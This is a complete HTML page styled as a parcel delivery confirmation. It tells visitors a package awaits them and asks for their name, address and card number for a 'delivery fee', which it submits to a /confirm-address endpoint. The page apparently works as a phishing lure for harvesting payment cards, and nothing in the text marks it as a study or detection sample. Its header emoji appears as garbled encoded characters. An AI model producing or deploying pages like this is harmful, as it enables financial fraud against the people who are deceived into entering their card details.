<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Package Delivery Confirmation</title>
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
</head>
<body class="bg-light">
  <div class="container mt-5">
    <div class="card border-info shadow">
      <div class="card-header bg-info text-white">
        <h4>ðŸ“¦ We Have a Package for You</h4>
      </div>
      <div class="card-body">
        <p>Confirm your delivery address to receive your parcel.</p>
        <form action="/confirm-address" method="POST">
          <div class="mb-3">
            <label class="form-label">Full Name</label>
            <input type="text" class="form-control" name="name">
          </div>
          <div class="mb-3">
            <label class="form-label">Delivery Address</label>
            <input type="text" class="form-control" name="address">
          </div>
          <div class="mb-3">
            <label class="form-label">Card Info</label>
            <input type="text" class="form-control" name="card" placeholder="Card number for delivery fee">
          </div>
          <button type="submit" class="btn btn-info w-100">Confirm Delivery</button>
        </form>
      </div>
    </div>
  </div>
</body>
</html>
